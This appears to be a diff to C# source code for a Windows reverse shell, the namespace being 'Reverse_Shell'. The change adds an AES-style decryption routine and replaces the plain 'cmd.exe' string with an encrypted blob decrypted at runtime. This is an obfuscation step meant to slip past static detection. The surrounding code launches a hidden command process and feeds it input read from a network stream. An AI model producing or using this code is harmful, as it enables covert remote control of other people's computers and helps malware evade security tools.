@@ -6,12 +6,16 @@ using System.ComponentModel;
 using System.Linq;
 using System.Net;
 using System.Net.Sockets;
+using System.Security.Cryptography;
+using System.IO;
 
 namespace Reverse_Shell
 {
     class Program
     {
         static StreamWriter streamWriter;
+        private const int Keysize = 256;
+        private const int DerivationIterations = 1000;
 
         static void Main(string[] args)
         {
@@ -26,7 +30,7 @@ namespace Reverse_Shell
                         StringBuilder strInput = new StringBuilder();
 
                         Process p = new Process();
-                        p.StartInfo.FileName = "cmd.exe";
+                        p.StartInfo.FileName = Decrypt("iKhs/9z42rrMFpJnfIV2sZHHlc+K4awsji1elnvaYoZw3B1zF7GDRbBUSAMNigSC32wK4t0Q4xvxZpL//zUMcZJ3/6AXjvWxl/90Z5drOV0DyYE5zC3fQ5+FWuYm7HtC","abc");
                         p.StartInfo.CreateNoWindow = true;
                         p.StartInfo.UseShellExecute = false;
                         p.StartInfo.RedirectStandardOutput = true;
@@ -39,13 +43,45 @@ namespace Reverse_Shell
                         while (true)
                         {
                             strInput.Append(rdr.ReadLine());
-                            //strInput.Append("\n");
                             p.StandardInput.WriteLine(strInput);
                             strInput.Remove(0, strInput.Length);
                         }
                     }
                 }
             }       
+        }
+
+        private static string Decrypt(string cipherText, string passPhrase)
+        {
+            var cipherTextBytesWithSaltAndIv = Convert.FromBase64String(cipherText);
+            var saltStringBytes = cipherTextBytesWithSaltAndIv.Take(Keysize / 8).ToArray();
+            var ivStringBytes = cipherTextBytesWithSaltAndIv.Skip(Keysize / 8).Take(Keysize / 8).ToArray();
+            var cipherTextBytes = cipherTextBytesWithSaltAndIv.Skip((Keysize / 8) * 2).Take(cipherTextBytesWithSaltAndIv.Length - ((Keysize / 8) * 2)).ToArray();
+
+            using (var password = new Rfc2898DeriveBytes(passPhrase, saltStringBytes, DerivationIterations))
+            {
+                var keyBytes = password.GetBytes(Keysize / 8);
+                using (var symmetricKey = new RijndaelManaged())
+                {
+                    symmetricKey.BlockSize = 256;
+                    symmetricKey.Mode = CipherMode.CBC;
+                    symmetricKey.Padding = PaddingMode.PKCS7;
+                    using (var decryptor = symmetricKey.CreateDecryptor(keyBytes, ivStringBytes))
+                    {
+                        using (var memoryStream = new MemoryStream(cipherTextBytes))
+                        {
+                            using (var cryptoStream = new CryptoStream(memoryStream, decryptor, CryptoStreamMode.Read))
+                            {
+                                var plainTextBytes = new byte[cipherTextBytes.Length];
+                                var decryptedByteCount = cryptoStream.Read(plainTextBytes, 0, plainTextBytes.Length);
+                                memoryStream.Close();
+                                cryptoStream.Close();
+                                return Encoding.UTF8.GetString(plainTextBytes, 0, decryptedByteCount);
+                            }
+                        }
+                    }
+                }
+            }
         }
 
         private static void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
